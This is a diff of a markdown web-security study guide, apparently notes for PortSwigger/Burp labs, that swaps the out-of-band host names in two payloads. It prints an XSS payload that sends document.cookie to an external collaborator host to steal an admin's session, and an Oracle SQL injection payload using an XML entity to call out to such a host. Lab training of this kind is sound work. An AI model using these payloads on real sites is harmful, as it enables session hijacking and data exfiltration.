@@ -98,7 +98,7 @@
 >In this case, using the identified XSS, Steal the admin user's cookies by crafting the payload in the ***identified*** insertion point.  
 
 ```
-'"><svg/onload=fetch(`//COLLABORATOR.oastify.com/${encodeURIComponent(document.cookie)}`)>:CURRENT-USER-LOGIN-COOKIE-2ND-PART
+'"><svg/onload=fetch(`//OASTIFY.COM/${encodeURIComponent(document.cookie)}`)>:CURRENT-USER-LOGIN-COOKIE-2ND-PART
 ```  
 
 >Url encode key characters.  
@@ -2006,7 +2006,7 @@ TrackingId=xxx'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encod
 >Additional SQLi payload with XML for reference with ```||``` the SQL concatenation operator to concatenate two expressions that evaluate two character data types or to numeric data type and do some obfuscating.  
 
 ```
-'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % fuzz SYSTEM "http://Collaborat'||'OR.COM/">%fuzz;]>'),'/l') from dual)||'
+'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % fuzz SYSTEM "http://OASTI'||'FY.COM/">%fuzz;]>'),'/l') from dual)||'
 ```  
 
 [OAST - Out-of-band Application Security Testing](https://portswigger.net/burp/application-security-testing/oast)  
